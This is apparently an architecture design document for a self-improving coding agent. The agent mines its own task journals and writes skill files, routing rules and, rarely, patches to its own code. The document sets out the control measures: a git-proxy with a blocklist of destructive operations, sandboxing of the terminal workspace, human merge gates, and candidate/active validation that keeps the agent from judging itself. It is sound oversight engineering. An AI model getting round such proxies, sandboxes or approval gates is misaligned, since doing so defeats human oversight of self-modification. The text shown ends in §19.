# Self-Improving Little-Coder: Architecture Design Notes

A working document capturing decisions and open questions for a self-improving deployment of [little-coder](https://github.com/itayinbarr/little-coder). Intended to guide later implementation, not to be a finished spec.

---

## 1. Goal

Run little-coder as a containerized service that accumulates expertise from its own work. Over time, the system identifies recurring gaps in its skill set and writes new knowledge, tool-use craft, plan templates, routing rules, or — in rare and justified cases — patches to its own code.

The output of the system is primarily **knowledge**, not patches. Code change is the last resort, not the headline feature.

## 2. Core reframe

Earlier framing: "diagnose whether errors are the model's or the harness's fault."

Final framing: **identify clusters of work where the agent lacks craft, and build that craft.** A cluster might be domain-shaped (Rust async lifetimes), strategy-shaped (specs that live in tests, not prose), or process-shaped (multi-file refactors that fail without a plan). Attribution-to-blame is replaced by attribution-to-craft.

The judge does not ask "what went wrong." It asks: _"If a single fact, heuristic, or strategy had been in the agent's context, would it have flipped the outcome — and what would that thing have to say, written so a future agent can read it in five seconds?"_ That's the counterfactual frame.

## 3. Two loops, kept separate

- **Inner loop** (exists in little-coder today): generate → tool/test error → retry. Fixes the user's code. No changes needed.
- **Outer loop** (new): across many tasks, mine the journals, cluster, write artifacts, validate, merge. Fixes little-coder.

Conflating them is the primary failure mode for systems like this. They run on different cadences, with different success criteria, and produce different artifacts.

_Caveat on "no changes needed":_ the inner loop's retry _logic_ is untouched, but it is still **instrumented** — MCP exposure (§17), journals with session/channel id (§4, §19). Instrumentation wraps the loop; it does not alter its behavior. "No changes" means no logic changes, not no diff.

## 4. Container architecture

Three processes inside the container, plus a sidecar:

- **`agent`** — little-coder REPL exposed as an MCP server behind an `mcpo` proxy (see §17), not raw HTTP/socket. Writes append-only journals: `tool_calls.jsonl`, `errors.jsonl`, `outcomes.jsonl` (final pass/fail + tools fired + cluster tags once assigned + session/channel id — see §17, this field is a tier-0 build requirement, not a later refinement).
- **`meta`** — the outer loop. Triggered by evidence thresholds (see §6), not a clock. Runs clustering, judge prompt, artifact drafting, validation, merge.
- **`git-proxy`** — wraps every git call. Whitelist: `commit`, `branch`, `checkout`, `merge --no-ff`, `tag`, `revert`, `reset --hard <tag>`, `fetch` (restricted to remotes pre-configured by the operator; no all-refs, no new remotes mid-task — an unconstrained `fetch` against a hostile remote can pollute every worktree off the canonical clone, §17). Blocklist: `push --force`, `branch -D`, `filter-branch`, `gc --prune=now`, `remote add`, `remote set-url`, history rewrites, anything touching `.git/` directly. **Sited at the open-terminal workspace edge** (§17): git inside the workspace is the proxied binary, and little-coder has no un-proxied raw-git path it can issue into the terminal. The whitelist's guarantees hold only if it is the _only_ git path. **Trust boundary:** operator-level git (via `docker exec`) bypasses the proxy by design — agent untrusted, operator trusted; the proxy exists for the agent, not the operator.
- **Inference backend** — separate container, not inside. In this stack that is `llama-cpp`/llama-swap at `http://llama-cpp:8080/v1` on the internal `llm-net`. Both little-coder and the judge (§23) are clients of it; no other backends configured. Two model variants serve different roles:
  - **`qwen3.6:27b`** — the reasoning variant. Used for work where deliberation pays for its tokens: the counterfactual + adversarial judge prompt (§23), artifact drafting (§5), §8 justifications, type-selection within tiers (§5).
  - **`qwen3.6:27b-nothink`** — the fast variant. Used for high-frequency, low-deliberation work: cluster assignment (§20), sanitization checks (§23), routing decisions, in-context augmenter selection (§22).

  The split is operational, not architectural — both variants are the same family on the same backend, swapped per call by model id.

## 5. Artifact taxonomy (four types, increasing risk)

Outer loop produces exactly one type per iteration. The type is decided _before_ writing, by asking which intervention best fits the cluster.

1. **Knowledge entries** — `skill/knowledge/*.md`. Domain facts. Pure additions, near-zero blast radius.
2. **Tool-use craft** — `skill/tools/*.md`. Patterns for using a tool in a context. E.g. "When Edit fails with no-match, re-Read first; the model's view of the file may be stale."
3. **Plan-template slots** — additions to the planner's prompt structure (e.g. an _edge cases_ slot when errors cluster on missed edges). Higher risk: touches the prompt driving every plan.
4. **Routing rules** — when to invoke planner, deliberate mode, larger thinking budgets. Easy to write, easy to mis-tune; can suppress evidence collection (see §7).

Code changes to `agent.py` / `local/` are a fifth tier, gated by §8.

**Type selection within a tier (resolved).** The §6 escalation ladder controls _how much risk_ the system can take — tier-0 caps at knowledge, tier-1 at tool-craft/plan-slot, tier-2 at routing rule, tier-3 at code. _Within_ a tier that offers a choice (notably tier-1: tool-craft vs. plan-slot), the judge picks the type that best fits the cluster's signature, with the choice itself journaled.

The selection prompt at tier-1 looks like: _"This cluster has persisted past tier-0. Given its signature \[occurrences, error shapes, context patterns\], is the gap better addressed by (a) a tool-use pattern in `skill/tools/`, or (b) a slot added to the planner template? Argue both, then pick."_ The argument is the journal entry and is what the §24 operator surface shows for approval.

This is the same shape as §8 (judge argues, journal records, human approves), applied within a tier rather than only between tiers. The escalation ladder remains the safety mechanism; type selection is the cluster-fit mechanism. The judge never escalates risk class on its own — that requires the §6 quarantine window plus, for tier-2 → tier-3, the full §8 justification.

## 6. Evidence-based escalation

The trigger is not recurrence; it is **recurrence after intervention**.

Tier ladder for a given cluster:

| Tier | Trigger                                           | Intervention                |
| ---- | ------------------------------------------------- | --------------------------- |
| 0    | N ≥ ~5 occurrences, no prior intervention         | Knowledge entry             |
| 1    | ~20+ new occurrences after tier 0, rate unchanged | Tool-use craft or plan-slot |
| 2    | Same persistence after tier 1                     | Routing rule                |
| 3    | Same persistence after tier 2                     | Candidate code change (§8)  |

Each tier requires a **quarantine window** of M tasks before becoming eligible for escalation. M is per-cluster, sized to the cluster's natural frequency — a global constant marches every cluster to "code change" too fast. Skill artifacts often need 50+ task instances before their effect is statistically legible.

**Cohort accounting, not raw counters.** Each cluster's record holds: occurrences before intervention, intervention timestamp, occurrences after, rate delta. Without before/after windows, every pattern looks like it persists forever.

## 7. Routing rules need an exploration policy

Routing decisions can suppress their own evidence. If the agent stops invoking the planner for class X based on one round, it stops collecting new evidence about whether planner would have helped X.

**Policy (resolved): both, in sequence.** The two approaches answer different questions and combine cleanly:

1. **Staged-freeze gates entry into tier-2.** No routing rule is authored for a cluster until its tier-0 (knowledge) and tier-1 (tool-craft / plan-slot) interventions have run their quarantine windows (§6) and the cluster has demonstrably resisted them. This is the same evidentiary discipline as the rest of §6's ladder — routing rules don't get to skip the queue.
2. **Random-exploration runs against routing rules indefinitely once they exist.** Each routing rule retains a 5–10% exploration rate where the rule is _not_ applied — the system deliberately takes the path the rule says to avoid, so post-rule evidence keeps flowing. Without this, a rule that's wrong becomes self-confirming forever.

Together: staged-freeze controls _when_ routing rules are born; random-exploration controls _how_ they behave once alive. The §21 efficacy track is the catch — a routing rule that exploration shows is wrong (cohort doesn't move, or moves the wrong way) is auto-retired.

## 8. The code-change justification requirement

Before any self-PR to `agent.py` or `local/` is allowed, the judge must produce a written argument with this structure:

1. The cluster and its persistence record across tiers 0–2.
2. The specific interventions tried.
3. **An explicit argument for why no plausible knowledge entry, tool-craft pattern, plan slot, or routing rule could have closed the gap.**
4. The proposed structural change and its expected effect.

That argument is itself a journal entry, auditable later. If the judge cannot articulate (3), the structural change is not justified — write the missing skill instead and let the cohort prove it insufficient.

## 9. Two telemetry tracks

- **Acute error track** — per-task tool errors, failed tests, parse failures, loops. Drives the cluster system above.
- **Longitudinal structural track** — cyclomatic complexity, file size, fan-out, churn, sampled across repos little-coder has worked in, plotted over time. Drives a separate pattern miner that operates on _trends_, not error counts.

The structural track is the safety net for **silent clusters**: tasks where tests pass but the code is bad (e.g. SOLID decay after several features). The acute track cannot see these because the inner loop reports success.

## 10. Clustering: human-readable, judge-proposed

Raw embedding clusters over error traces tend to pick up shallow features (same language, same file size). The judge model proposes candidate cluster labels in natural language, refined across iterations.

Human-readable labels add a step but allow auditing what the agent thinks it's learning. Worth the cost, at least for the first several months of operation.

## 11. Skill library organization

Add tag/frontmatter to every skill artifact from day one: language, domain, tool, task-shape. As the library grows, the augmenter must _select_ relevant entries; otherwise context fills with Rust tips during a Python task. Little-coder's current loader pulls everything in — this needs revisiting before the library exceeds a few dozen entries.

## 12. Safety rails

- All outer-loop changes land on `auto/<date>-<topic>` branches. Never direct to `main`.
- Merge to `main` requires (a) Polyglot subset score ≥ baseline, _and_ (b) human approval — at least until the attribution layer has earned trust.
- Tag `pre-iteration-<n>` before each outer-loop attempt; rollback is one command. With the candidate/active deploy model (§18), the active instance is itself the rollback target by construction — a failed candidate is discarded without touching anything running.
- Container holds a fine-grained PAT scoped to `contents:write` on the little-coder repo only. No repo deletion, no admin, no other repos.
- Judge independence: the ideal is a different, stronger model, but the privacy mandate (§23) keeps the judge in-stack on the same backend. The same-model blind spot is mitigated by adversarial framing plus three model-independent backstops (Polyglot, cohort, human gate). Full resolution in §23.
- **Self-improvement remote is private.** The repo little-coder pushes `auto/*` branches and tier-3 PRs to is a private remote, full stop. Cohort evidence, journal ranges, and §8 justifications travel via the PR body (§18 step 6); routing them anywhere a third party might mine ML training data on is incompatible with the privacy posture. Not a hardening — a precondition.
- **Sanitization applies to every outbound, not just judge calls.** The §23 filter runs on the judge path, the PR-body assembly (§18 step 6), and any future operator-export path. One filter, multiple call sites — filter failure aborts the call, never "send anyway."

## 13. The Polyglot oracle

Little-coder ships with the 225-exercise Aider Polyglot benchmark. Every artifact merge — even knowledge entries — runs a Polyglot subset and must not regress against baseline. This is the system's honest score function, and a key reason this design is feasible here when it isn't in most self-modifying systems.

Subset selection should bias toward exercises in the cluster's domain. A pure random subset will be noisy at small N.

**Oracle as interface (DIP note).** Polyglot is *the* oracle today, but it should be wrapped behind an `Oracle` interface (`run_subset(cluster_id, biased_subset) → ScoredResult`) so that adding MultiPL-E, SWE-bench, or a domain-specific harness later does not require rewriting §21's validation pipeline. Cheap now; rewrite-class expensive if deferred until the third oracle is needed.

## 14. Preflight period

Before any meta-loop runs, deploy the container with **journals on, meta-loop off**, for ~1–2 weeks of real workload. Reasons:

- The cluster taxonomy needs real errors, not imagined ones, to be useful.
- The cohort math needs baselines.
- The judge prompt needs real examples to calibrate against.

Building the attributor against synthetic errors usually produces something that catches nothing.

## 15. Decisions still open

- ~~**Model.**~~ **Resolved** — `qwen3.6:27b` (reasoning) and `qwen3.6:27b-nothink` (fast) on `http://llama-cpp:8080/v1`. Role split in §4. No other backends.
- ~~**Open-terminal session model.**~~ **Resolved** — per-session git worktrees off a canonical clone of one focused project; per-session and per-repo serial; bounded-N validation parallelism; tier-3 escalates to a separate ephemeral container. Project switching is an explicit operator action via `/project repo: <link>`. Full mechanism in §17 (session model + project focus + persistence boundary).
- ~~**Fork-parent vs. self-artifact merge discipline.**~~ **Resolved** — pin to a known-good upstream commit; pulls are operator-initiated via `/upstream pull`. Tiers 0–2 land cleanly (separate paths); tier-3 conflicts resolved on a merge branch with full §18 re-validation. Self-authored tier-3 artifacts invalidated by an upstream pull are journaled and retired. Full mechanism in §17.
- ~~**Deploy actor.**~~ **Resolved** — the operator, via PR + manual `docker compose up -d --build`. Tier-3 only; tiers 0–2 do not require a restart. Full flow in §18 step 7 and the deploy-per-tier table in §16.
- ~~**Cohort table schema.**~~ **Resolved** — schema in §19 (journal envelope) + §20 (cluster identity, split/merge lineage). Per-cluster M still tuned in preflight.
- **Polyglot N & regression margin.** Minimum validation subset size and the noise margin that counts as a regression — tuned against measured Polyglot variance in preflight (§14, §21).
- **Counterfactual judge prompt.** Concrete wording, few-shot examples, output format.
- ~~**Cluster → artifact-type router.**~~ **Resolved** — escalation ladder (§6) controls risk class; judge picks the type within the tier when the tier offers a choice (notably tier-1: tool-craft vs. plan-slot). Selection is journaled. Full mechanism in §5.
- ~~**Routing-rule exploration policy.**~~ **Resolved** — both, in sequence: staged-freeze gates tier-2 entry; 5–10% random-exploration runs against each routing rule indefinitely after authoring. §21 efficacy retires rules that don't pay off. Full mechanism in §7.
- ~~**Skill frontmatter schema.**~~ **Resolved** — schema and selection logic in §22.
- ~~**Judge model identity.**~~ **Resolved (in-stack now)** — in-stack `qwen3.6:27b` under adversarial framing (§23). OpenRouter to a stronger external judge is a possible future change if the privacy posture relaxes; deferred, not rejected.
- **`task_abandoned` timeout policy.** §19's abandonment threshold is doing real work: too short and a legitimate 6-hour refactor gets excluded; too long and a hung loop holds a worker for days. Likely per-channel (interactive vs. validation vs. batch), tuned in preflight.
- **Neutral test-runner for §18.** Whether to evolve step-3 toward a small shared runner that both active and candidate are clients of, removing active's orchestration control over its own successor's validation. Pragmatic first cut is active-as-driver; promotion to neutral runner is a later hardening.
- **Open-terminal network posture (ai-stack compose change).** §17 states the target posture (own network, explicit egress to llama-cpp + operator-configured upstream + private search gateway only); achieving it is an ai-stack compose change outside this doc. Tracking item, not a design question.
- **Sanitization audit cadence.** §23 audit loop defaults to monthly. Confirm after the first filter-drift incident (or after 6 months of clean audits, whichever comes first).
- **Reserved-slot promotion threshold.** §24 defer policy ships first. If preflight (§14) or steady-state shows meta-loop routinely starving under interactive load (measured as `meta deferred > N% of attempts` over a window), promote to a reserved llama-swap slot — pick N during preflight.
- **Backup cadence & restore drill.** Volumes from §16 step 1 (`little-coder-skill`, `little-coder-journals`, `little-coder-cohorts`, `little-coder-polyglot`) need the same Alpine-cron backup pattern as `mnemory-backup` in the stack. Cadence default: daily. Restore drill before tier-1 lands; without a tested restore, the backups are theatre.

## 16. Suggested build order

1. Container scaffold: `agent` as an MCP server behind `lc-mcpo` (§17), client of the `llama-cpp` backend, journals on with the **full §19 schema including `session_id`, `channel`, and `user_id`**. **These fields are unrecoverable if added later — journals are append-only, and the cohort/lineage math in §6/§20 cannot be retrofitted onto data that never carried full attribution. Tier-0 build requirement; ship them on day one or accept that early traffic is unusable for cohort analysis.** **Declare named volumes at scaffold time** for everything persistent: `little-coder-skill/` (artifact library, §22), `little-coder-journals/` (§19), `little-coder-cohorts/` (§20), `little-coder-polyglot/` (canonical Polyglot clone). These are mounted into `agent` and `meta`; tier-3 rebuilds (§18 step 7) recreate the container but not the volumes. Missing this is the same unrecoverable mistake as a missing journal field — the first rebuild wipes months of accrued state.
2. Pin the §19 journal schema and the §17 workspace/session model _before_ taking real traffic. Stand up the **CLI operator surface** (§24) — subcommands for `project switch`, `upstream pull`, `pending`, `approve`. CLI is near-free against little-coder's existing CLI and is sufficient for the operator gate from day one. Run the preflight workload (§14).
3. Draft the cluster taxonomy (§20) and the counterfactual + adversarial judge prompt (§23) against real journals. Stand up journal sanitization (§23) before the judge is ever called.
4. Build `meta` for tier 0 only. Manual review for every artifact via the operator surface (§24). No automation past artifact drafting.
5. Add the Polyglot gate with real validation semantics (§21): measured baseline, regression margin from preflight variance, artifact-in-context assertion.
6. Add `git-proxy` at the workspace edge (§4/§17) and branch/tag conventions (§12).
7. **Build the OWUI pipeline (§24).** Task triggers as chat; operator commands as slash-commands; artifact-review messages with structured rendering. Not a "later if needed" — a real implementation effort, second only to CLI because parity matters for the operator gate to feel as effective in OWUI as it does in CLI.
8. Exit preflight only on the §24 checklist. Promote tier 0 to auto-merge once trusted, with efficacy reversion (§21) live. Then build tier 1.
9. Add the longitudinal structural track (§9) in parallel with tier 1.
10. Tier 2 only after tier 1 shows demonstrable cohort improvement (§20). Tier 3 last, and only with §18 candidate/active plus the §24 deploy actor decided.

Code changes to little-coder itself (tier 3) are not a near-term deliverable. They are a possibility the architecture leaves open, not a planned feature.

**Deploy flow per tier.** Not every tier needs the same merge-and-deploy path. The flow scales with blast radius:

| Tier                       | Artifact form                                 | Auto-mergeable?                | Restart needed?                                                         | Flow                                                                                    |
| -------------------------- | --------------------------------------------- | ------------------------------ | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| 0 (knowledge)              | `skill/knowledge/*.md`                        | Yes, once trusted (§16 step 8) | No — read by augmenter at next task                                     | git-proxy merges to `main`, next task picks it up                                       |
| 1 (tool-craft / plan-slot) | `skill/tools/*.md` or planner-prompt addition | Yes, once trusted              | No — same as tier-0 if file-based; verify if it touches a loaded prompt | Same as tier-0                                                                          |
| 2 (routing rule)           | Config file or rule entry                     | Yes, once trusted              | Depends — config files no; code-path changes yes                        | Probably no restart; verify per-rule                                                    |
| 3 (code change)            | Diff to `agent.py` / `local/`                 | **No, ever**                   | Yes                                                                     | §18 full flow: candidate validation → PR → human merge → `docker compose up -d --build` |

The §18 candidate/active deploy model applies **only to tier-3**, because tier-3 is the only tier where the running container has the affected code loaded. Tiers 0–1 are data the augmenter reads each task; tier-2 is usually data the router reads each task. Building tier-3's machinery is therefore last (step 10), and the PR + manual deploy actor (§18 step 7) is sized for tier-3's expected rarity.

## 17. Service surface and workspace sharing

This section is placed last for low edit-churn, but architecturally it belongs with §3–§4: it governs how the system is invoked and how its blast radius stays contained.

**Grounding — both halves already exist in the target stack.** The ai-stack already runs:

- `open-terminal` — Open WebUI's terminal service. Separate container, API-key'd, localhost-bound, `network_mode: service:openwebui`.
- `mcpo` — an MCP-as-OpenAPI proxy, already in production fronting the private search gateway.

little-coder is exposed the same way the search gateway already is: **little-coder container → MCP server → an `lc-mcpo` sidecar → OpenAPI → registered as an OWUI tool**; CLI and other clients hit the same OpenAPI surface or the MCP socket directly. This is the concrete form of §4's "exposed over HTTP/socket" — existing proven infrastructure applied again. little-coder and open-terminal stay **separate containers**; little-coder manages its own lifecycle (see update streams below).

**The execution model: open-terminal is the workspace, not a window.** little-coder does not host a working tree. open-terminal **is** the workspace and the execution substrate — the repo lives there, edits and command/test runs happen there. little-coder is the controller that drives it. The intended flows:

```
Flow 1:  OWUI (prompt) → little-coder → open-terminal (edits/commands) → inner loop → task complete → OWUI
Flow 2:  User CLI       → little-coder → open-terminal (edits/commands) → inner loop → task complete → User CLI
```

OWUI and CLI are **triggers**: they start a task and await the result. They do not share a live shell with little-coder concurrently.

**Two planes, kept distinct:**

- **Control plane** — little-coder. Triggered by OWUI/CLI, owns the inner loop (§3).
- **Workspace + execution plane** — open-terminal. The repo, the edits, the command/test runs. This is the blast-radius boundary.

**Retraction.** An earlier draft of this section asserted the opposite — execution inside little-coder's container, open-terminal as a read-only inspect window, and a claim that a shared execution surface would collapse the §3 loop separation. Under the intended flow that argument is wrong and is withdrawn: the human _triggers and awaits_ rather than sharing a shell, so the inner loop (little-coder ↔ open-terminal) stays cleanly separate from the human surface. §3 is preserved by the trigger/await pattern, not by moving execution away from open-terminal.

**What the model does change: git-proxy moves, it does not disappear.** §4/§12's rollback and "never direct to `main`" guarantees depend on git-proxy being the _only_ git path. With execution living in open-terminal, the proxy is sited at the **open-terminal workspace edge**: git inside the workspace is the proxied binary, and little-coder has no un-proxied raw-git path it can issue into the terminal. This is a correctness requirement for the safety model, not a preference (reflected in §4's git-proxy bullet).

**Blast radius is now open-terminal's environment.** Because open-terminal is `network_mode: service:openwebui`, anything that namespace can reach, the inner loop can reach by issuing commands into the workspace. open-terminal's own containment — capabilities, network reachability, filesystem scope, `no-new-privileges` — is therefore the de facto sandbox for the entire self-improving system and must be hardened and reviewed as such. It is no longer "just a terminal."

**Network posture (target).** The current `network_mode: service:openwebui` was sized for human use of the terminal, not for an autonomous self-modifying loop. Target posture for the self-improving deployment: open-terminal moves to its own network with **explicit egress only to what the inner loop needs** — `llama-cpp` on `llm-net` for inference, the operator-configured upstream git remote for the focused repo, the private search gateway if web-search is enabled, nothing else. This is an ai-stack compose change outside this doc; it is a deployment prerequisite, listed open in §15. Until it lands, compensating controls (more aggressive sanitization, journal audit, tighter operator review of artifacts) carry more load than they otherwise would.

**Session model (resolved).** open-terminal is one container, one focused project at a time. Per-task isolation is achieved with **git worktrees off a canonical clone**: each task gets `/workspace/sessions/<session_id>/` as a worktree, work happens there, push back to the canonical clone on completion, then `git worktree remove`. Concurrency:

- **Per-session-id**: serial. A session never runs two things at once.
- **Per-repo, across sessions**: serial by default. Since there is only one focused project, this reduces to "interactive tasks serialize" — predictable and matches user intuition. **Queued, not rejected:** a Flow 2 (CLI) trigger arriving during a Flow 1 (OWUI) task waits its turn; FIFO. Triggers do not race; users do not see "busy, try later."
- **Validation runs**: own worktree, parallel to interactive work, bounded to N concurrent (start with N=1; §24 single-flight already enforces this at the meta level, but the merge-time Polyglot gate runs outside meta). **Validation worktrees are listed in the "active sessions" check** for `/project repo:` — switching projects mid-validation would invalidate the run.
- **Human attach**: read-only to a session's worktree. Mid-task writes from a human collide with the inner loop in ways no design can save; explicit read-only attach is the honest answer.
- **Tier-3 candidate validation (§18)**: escalates to a _separate ephemeral open-terminal-shaped container_, not a worktree. Rare, important, warrants a clean room. This is the only place Option C (per-session containers) is used.

**Project focus (resolved).** open-terminal hosts one focused project at a time. Switching projects is an explicit operator action via `/project repo: <link>` (OWUI slash-command or equivalent CLI), distinct from a task trigger. Behavior:

```
/project repo: <link>
  → normalize <link> to canonical form (host + owner + repo, lowercased)
  → if no current focus:
      clone, set focus, journal `project_switched`, proceed
  → if matches current focus:
      no-op, proceed
  → if doesn't match current focus:
      → if any active sessions: reject with the list, suggest cancel-or-wait
      → else: tag prior state, tear down worktrees, clone, set focus,
              journal `project_switched`, proceed
```

URL normalization prevents spurious wipes when SSH and HTTPS forms of the same repo are used interchangeably. The in-flight guard prevents silent wipe-under-load. The `project_switched` journal record matters for §20 cohort analysis: rate changes coinciding with a switch must be visible in the data, not invisible.

**Persistence boundary.** Little-coder's own state — skill library (§22), journals (§19), cohort counters (§20), the canonical Polyglot clone — lives on **named docker volumes mounted into little-coder's containers**, not inside the container filesystem (§16 step 1). This matters operationally: tier-3 deploys (§18 step 7) run `docker compose up -d --build little-coder`, which **recreates the container but preserves the volumes**. Treating this state as "inside the container" silently wipes months of accrued expertise on the first rebuild. The volumes are the persistence boundary; the container is ephemeral by design.

A project switch wipes open-terminal's project workspace; it does not touch little-coder's mounted volumes. Cross-project learning (a Rust lifetimes cluster discovered on project A paying off on project B) is the entire point of §6 and survives switches via the volume boundary, not by special handling.

**Synergy with §14.** OWUI/CLI users driving little-coder on real repos through the control plane _is_ the real preflight workload — free, high-fidelity journal collection instead of synthetic, provided attribution is in place from the start:

**Hard prerequisite — session/channel attribution.** With two trigger flows plus the meta-loop, every journal line MUST carry a session id and a channel tag from day one. Without it, §6's before/after cohort windows interleave across unrelated callers and the rate-delta math silently lies. Near-free to add when the MCP wrapper is first built, effectively unrecoverable retroactively. A **tier-0 build requirement**, not a later refinement (reflected in §4's journal schema).

**Two update streams little-coder must reconcile.** little-coder is self-managing _and_ tracks its fork parent:

- **Self-improvement** — the outer loop's `auto/<date>-<topic>` branches (§5–§12).
- **Upstream fork-parent** — the extended fork (`devonpveller/little-coder-extended`) tracks `itayinbarr/little-coder`. Upstream pulls and self-authored artifacts can collide on the same files (skill loader, `agent.py`, planner prompt).

**Policy (resolved): pin to a known-good upstream commit; pulls are operator-initiated.** Upstream is never auto-pulled. The operator initiates a pull via `/upstream pull` (OWUI slash-command or CLI), parallel in shape to `/project repo:`. Behavior:

- For tiers 0–2 (additive skill files under `skill/`), upstream pulls cannot conflict because upstream doesn't touch those paths. The pull lands cleanly. No special handling.
- For tier-3 code (changes to `agent.py` / `local/`), a real merge conflict is possible. On conflict, the operator resolves it manually on a `upstream-merge/<date>` branch, then runs validation before it becomes the new active. **Validation scope for upstream merges is broader than §18's cluster-biased subset:** an upstream merge can touch the harness, planner prompt, or skill loader — anything — so the regression risk is not confined to one cluster's domain. Use a **stratified Polyglot subset across all live cluster domains** (at least one exercise per active cluster), or the full 225-exercise benchmark if compute allows. The §18 candidate/active deploy mechanism is reused, but with this broader test set. A self-authored tier-3 artifact that no longer makes sense against the new upstream base is journaled as `invalidated_by_upstream` and retired (§21 efficacy track picks this up if it slips through).
- The pull itself is journaled as `upstream_pulled` with the old and new upstream commit ids — same rationale as `project_switched`: cohort-rate changes coinciding with an upstream pull must be visible.

Auto-rebasing onto a moving upstream is explicitly avoided. The class of failures it produces — an artifact that validated yesterday now sits on a subtly different base — is hard to debug and easy to prevent by making the pull an explicit operator action.

## 18. Candidate/active deploy model for tier-3

Blue/green deployment for self-modification. It converts the dangerous thing ("a process mutates itself") into a well-understood one ("stand up a candidate, validate it, swap, keep the old one as the rollback target"). This is the validation-and-deploy **mechanism** for a tier-3 artifact, not a replacement for the pipeline: the change is still an `auto/<date>-<topic>` branch with its §8 written justification.

**Flow.** Active little-coder runs the cycle until it produces a tier-3 artifact, then:

1. Stage the artifact in a separate ephemeral workspace — its own open-terminal, per §17, distinct from interactive-task workspaces.
2. Provision a **paired candidate topology**: a `candidate-little-coder` container (built from the staged code) *and* its own `candidate-open-terminal` container — mirroring the active topology, not collapsing into one container. The candidate-little-coder mounts:
   - **Active's persistent volumes (§16 step 1) as a read-only snapshot.** The candidate reads active's skill library, cohorts, and journals to behave coherently, but cannot mutate them. A buggy candidate physically cannot corrupt active state.
   - **A writable tmpfs** for the candidate's own ephemeral journals/state during validation, discarded on teardown.
   - **The same containment as active** (capabilities, network policy from §17 target posture, `no-new-privileges`). Tier-3 is not a place to loosen sandboxing.
3. The **active** instance drives the test as a stable, known-good harness. It is the driver, not the arbiter. _Residual asymmetry, acknowledged:_ active still controls which tests run, how repro is set up, and what counts as a successful candidate boot. The verdict (step 5) is external, but the orchestration is not. A neutral test-runner that both active and candidate are clients of would be cleaner; active-as-driver is a pragmatic first cut, not the final form (open follow-up below, §15).
4. Two acceptance tests, both required:
   - **Issue fixed** — reproduce-then-fix the specific §8 cluster that justified the change.
   - **No regression** — Polyglot subset (§13), biased to the cluster's domain, score ≥ baseline.
5. Verdict comes from the objective oracle: Polyglot score + §8 justification + §12 human gate. Never from the active instance's own assessment — that re-imports the self-judging blind spot §12 forbids.
6. On pass: tear down the candidate and its staged workspace; little-coder opens a **pull request** from `auto/<date>-<topic>` to `main` on the **private** self-improvement remote (§12). The PR body is mechanically templated from the cohort and validation records and carries:
   - The §8 justification (cluster history, interventions tried, structural argument).
   - §20 cohort evidence (cluster_id, occurrences, lineage).
   - §18 validation outputs (Polyglot exercises run, scores vs. baseline, issue-reproduces-then-fixes result).
   - §23 provenance (journal evidence range).

   **The PR body is passed through the §23 sanitization filter before posting** — the same filter used on judge calls (§12). Journal evidence ranges and cohort records can carry user code; a GitHub PR body is an external surface even when the remote is private (GitHub indexes, replicates, and may train on private repos depending on plan). One filter, every outbound. Filter failure aborts the PR — never "post anyway."

   Without this body, the PR is a diff with no context and review degrades into "skim and trust." The templating is mechanical, not judgment — the judgment is the reviewer's.

7. **Human merge + manual deploy.** The operator reviews the PR on the private remote (§12) and merges what they choose. After merge, the operator runs `docker compose up -d --build little-coder` (or equivalent) to bring the new version up. The active instance was never mutated; the restart is a clean swap between two known-good tagged commits — and the named volumes (§16 step 1) survive the rebuild, so accrued state is preserved. **Operator post-deploy responsibility:** verify the new container boots healthy (compose healthcheck green; sample task succeeds) before considering the deploy complete. If the new build fails to boot or fails the smoke task, rollback is `git revert` + the same compose command, or pinning to the prior tag — automation is overkill for tier-3's expected rarity (§16 step 10). If tier-3 ever becomes frequent enough that manual post-deploy verification is friction, a dedicated tiny supervisor service is the upgrade path; not now.

**Why this is the benign version of self-modification.** The candidate is torn down by an external actor while the active instance drives, so no process kills itself mid-task. The only restart is a clean container swap between two known-good tagged commits — not a process hot-patching itself.

**Cost.** Both instances are MCP clients of the same `llama-cpp:8080` backend (llama-swap, `n_parallel=2`): shared inference, no second model, no extra VRAM. The only added cost is the ephemeral staged workspace during validation.

**Open follow-ups.** How the candidate workspace is provisioned and torn down idempotently; whether step 3's "active drives" needs a timeout/watchdog so a hung candidate can't stall the active instance's own workload; whether to evolve toward a neutral test-runner that both active and candidate are clients of, removing the step-3 orchestration asymmetry. (Deploy actor is resolved: the operator, via PR + manual `docker compose`.)

---

_Sections 19–24 close gaps found in a full review of §1–§18: the data layer, cluster identity, validation semantics, the skill library lifecycle, privacy/poisoning, and meta-loop operations. Each states a default decision in the doc's voice; residual sub-questions are pushed to §15._

## 19. Journal schema & lifecycle

The cohort math (§6) and clustering (§20) are only as trustworthy as the journals. Pin this before preflight (§14) — fields cannot be retrofitted onto append-only history.

**Record envelope.** Every line in all three journals shares: `ts` (UTC), `task_id` (ULID), `session_id` + `channel` + `user_id` (§17, tier-0 — `user_id` carries the same unrecoverable-if-missed weight as `session_id` because OWUI authn supports multiple users; without it, cohorts conflate users' craft gaps), `repo` + `lang`, `seq` (per-task counter), `schema_version` (envelope version — readers must tolerate older shapes, see §24 schema migration). `task_id` is minted when a trigger (Flow 1/2) starts and closed by an explicit terminal record.

**Write-time validation.** All records validated against the envelope schema at write time; malformed records are rejected, not appended. A bug in `agent` cannot silently corrupt the journal that `meta` reads.

**Task lifecycle.** `task_started` / `task_ended` records bracket every task in `outcomes.jsonl`. Interleaved sessions are legal; a task is reconstructed by `task_id`, never by adjacency. An unclosed `task_id` past a timeout is recorded `task_abandoned` — neither pass nor fail, excluded from cohorts. _The timeout value is non-trivial and likely per-channel: a 6-hour legitimate hard refactor on the interactive channel must not be abandoned; a hung loop on a 5-minute validation task must not consume a worker overnight. Tunable in preflight — see §15._

**Outcome label — the hard one.** Polyglot tasks have an oracle; free-form OWUI/CLI tasks usually do not. Outcome ∈ {`pass`, `fail`, `unverified`}. `pass`/`fail` only with a checkable signal (test-suite exit, the task's own acceptance command, or **explicit caller confirmation via the operator surface — see below**). Otherwise `unverified`: it feeds the acute track **only as error evidence** (a tool error is a fact regardless of final outcome), never as a success signal. This closes the §9 "inner loop reports success" ambiguity — absent an oracle, success is not asserted; the longitudinal track (§9) is the net for `unverified` work.

